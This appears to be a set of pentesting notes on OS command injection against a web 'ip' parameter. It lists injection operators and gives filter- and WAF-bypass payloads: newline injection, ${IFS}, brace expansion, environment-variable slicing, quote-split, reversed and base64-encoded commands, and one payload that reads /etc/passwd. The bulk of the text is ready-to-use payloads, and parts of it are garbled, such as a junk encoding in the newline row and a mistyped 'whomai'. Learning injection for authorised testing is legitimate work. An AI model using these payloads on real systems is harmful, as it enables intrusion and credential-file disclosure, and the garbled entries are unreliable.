
| **Injection Operator** | **Injection Character** | **URL-Encoded Character**   | **Executed Command**                       |
| ---------------------- | ----------------------- | --------------------------- | ------------------------------------------ |
| Semicolon              | `;`                     | %3b                         | Both                                       |
| New Line               | `\n`                    | ccccccccccccccccccccccccccc | Both                                       |
| Background             | `&`                     | %26                         | Both (second output generally shown first) |
| Pipe                   | \|                      | %7c                         | Both (only second output is shown)         |
| AND                    | `&&`                    | %26%26                      | Both (only if first succeeds)              |
| OR                     | \|\|                    | %7c%7c                      | Second (only if first fails)               |
| Sub-Shell              | ` `` `                  | %60%60                      | Both (Linux-only)                          |
| Sub-Shell              | `$()`                   | %24%28%29                   | Both (Linux-only)                          |
### Blacklisted Characters

Try each of the above to find out which character is allowed, without an additional command. For example, the following is allowed (\n) where as all the other characters are blacklisted:

```bash
ip=127.0.0.1%0a
```

Next, add a space (+) to the command to verify if spaces are blacklisted. If this returns an error, spaces are black listed:

```bash
ip=127.0.0.1%0a+
```

### Using ${IFS}

A Linux Environment Variable using a space and a tab, and can be used for between command arguments. 

```bash
ip=127.0.0.1%0a${IFS}
```

The `Base Brace Expanse` automatically adds spaces between arrangements. E.g:

```bash
ip=127.0.0.1%0a{ls,-la}
ip=127.0.0.1%0a{ls,-la,index.php}
```

Using `${PATH:0:1}` add the character `/` to the path
Using `${LS_COLORS:10:1}` add the character `;` to the path

These can be useful when the `/` and `;` are blacklisted:

```bash
garffff@garffff:~$ echo ${PATH:0:1}
/
garffff@garffff:~$ echo ${LS_COLORS:10:1}
;
```

To look inside the directory:

```bash
ip=127.0.0.1%0a{ls,-la,${PATH:0:1}home${PATH:0:1}garffff}
```
### Blacklisted Commands

Common Command Bypasses. We cannot mix and match these, for example, if we use the `'` we have to stick with it.

Linux

```bash
whoami:
w'h'o'am'i
w"h"o"am"i
who$@ami
w\ho\am\i
```

Windows:

```bash
whomai:
who$@ami
w\ho\am\i
```

To read the passwd file, it would look something like this:

```bash
ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

### Command Obfuscation

Useful when bypassing WAFs.

Linux:

The following replaces all uppercase characters with lowercase:

```bash
The following replaces all uppercase characters with lowercase:
(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

This prints whoami:
(a="WhOaMi";printf %s "${a,,}")
```

Windows:

```bash
WhOaMi
```
### Reversed Commands

The following will issue the `whoami` command when the input is reversed

```bash
echo 'whoami' | rev
$(rev<<<'imaohw')
```

Example:

```bash
ip=127.0.0.1%0a$(rev<<<'imaohw')
```

### Using Base64

Use base64 to encode the command:

```bash
echo -n 'whoami' | base64
d2hvYW1p

$(base64 -d<<<d2hvYW1p)
```

Use it in the command injection:

```bash
ip=127.0.0.1%0a$(base64%09-d<<<d2hvYW1p)
```

The following tool can be used to obfuscate bash commands:
https://github.com/Bashfuscator/Bashfuscator